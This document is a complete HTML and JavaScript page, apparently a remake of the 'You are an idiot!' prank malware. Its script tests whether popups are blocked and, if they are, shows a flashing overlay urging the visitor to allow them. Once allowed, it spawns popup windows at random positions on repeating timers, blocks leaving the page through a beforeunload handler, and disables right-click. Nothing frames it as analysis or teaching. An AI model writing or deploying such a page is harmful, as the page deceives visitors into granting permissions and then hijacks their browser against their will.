<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body { 
      background: #000; 
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100vw;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    video { 
      width: 100%; 
      height: 100%; 
      object-fit: cover;
    }
    #popupWarning {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 10000;
    }
    #popupWarning.show {
      display: flex;
    }
    .warning-content {
      text-align: center;
      color: #fff;
      position: relative;
    }
    .warning-title {
      font-size: 3rem;
      color: #ff0;
      margin-bottom: 20px;
      animation: blink 1s infinite;
      text-transform: uppercase;
      font-weight: bold;
    }
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0.3; }
    }
    .warning-text {
      font-size: 1.5rem;
      margin-bottom: 30px;
    }
    .arrow-container {
      position: fixed;
      top: 20px;
      right: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .arrow {
      font-size: 6rem;
      animation: bounce 1s infinite;
      color: #ff0;
      transform: rotate(-45deg);
      text-shadow: 0 0 20px #ff0;
    }
    @keyframes bounce {
      0%, 100% { transform: rotate(-45deg) translateY(0); }
      50% { transform: rotate(-45deg) translateY(-20px); }
    }
    .arrow-text {
      color: #ff0;
      font-size: 1.2rem;
      font-weight: bold;
      margin-top: -20px;
      animation: textPulse 1s infinite;
      text-transform: uppercase;
    }
    @keyframes textPulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .click-here {
      position: fixed;
      top: 5px;
      right: 150px;
      background: #ff0;
      color: #000;
      padding: 10px 20px;
      border-radius: 50px;
      font-weight: bold;
      font-size: 1.1rem;
      animation: pulse 1s infinite;
      box-shadow: 0 0 30px #ff0;
      text-transform: uppercase;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
  </style>
</head>
<body>
  <video id="mainVideo" autoplay loop muted>
    <source src="tu_video.mp4" type="video/mp4">
  </video>

  <div id="popupWarning">
    <div class="warning-content">
      <div class="warning-title">⚠ Popups Blocked ⚠</div>
      <div class="warning-text">Enable popups to continue</div>
    </div>
    <div class="arrow-container">
      
      <div class="arrow">➤</div>
      <div class="arrow-text">Allow popups!</div>
    </div>
  </div>

  <script>
    let popupsEnabled = true;
    const openWindows = [];

    function testPopups() {
      try {
        const testWindow = window.open('', '_blank', 'width=1,height=1,left=9999,top=9999');
        if (!testWindow || testWindow.closed || typeof testWindow.closed === 'undefined') {
          popupsEnabled = false;
          document.getElementById('popupWarning').classList.add('show');
          document.getElementById('mainVideo').style.display = 'none';
          return false;
        } else {
          testWindow.close();
          popupsEnabled = true;
          document.getElementById('popupWarning').classList.remove('show');
          document.getElementById('mainVideo').style.display = 'block';
          return true;
        }
      } catch (e) {
        popupsEnabled = false;
        document.getElementById('popupWarning').classList.add('show');
        document.getElementById('mainVideo').style.display = 'none';
        return false;
      }
    }

    function abrirVentanaQueHuye() {
      if (!popupsEnabled) return;
      
      const width = 400;
      const height = 300;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      const nuevaVentana = window.open('popup_flee.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
      if (nuevaVentana) {
        nuevaVentana.blur();
        openWindows.push(nuevaVentana);
      }
    }

    function abrirVentanaQueRodea() {
      if (!popupsEnabled) return;
      
      const width = 300;
      const height = 250;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      const nuevaVentana = window.open('popup_orbit.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
      if (nuevaVentana) {
        nuevaVentana.blur();
        openWindows.push(nuevaVentana);
      }
    }

    testPopups();

    setInterval(() => {
      if (testPopups()) {
        setTimeout(() => {
          for (let i = 0; i < 3; i++) {
            setTimeout(() => abrirVentanaQueHuye(), i * 300);
          }
          for (let i = 0; i < 2; i++) {
            setTimeout(() => abrirVentanaQueRodea(), i * 400);
          }
        }, 1000);
      }
    }, 3000);

    setInterval(() => {
      if (popupsEnabled && openWindows.length < 10) {
        if (Math.random() > 0.5) {
          abrirVentanaQueHuye();
        } else {
          abrirVentanaQueRodea();
        }
      }
    }, 2500);

    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    });

    document.addEventListener('contextmenu', (e) => e.preventDefault());
  </script>
</body>
</html>
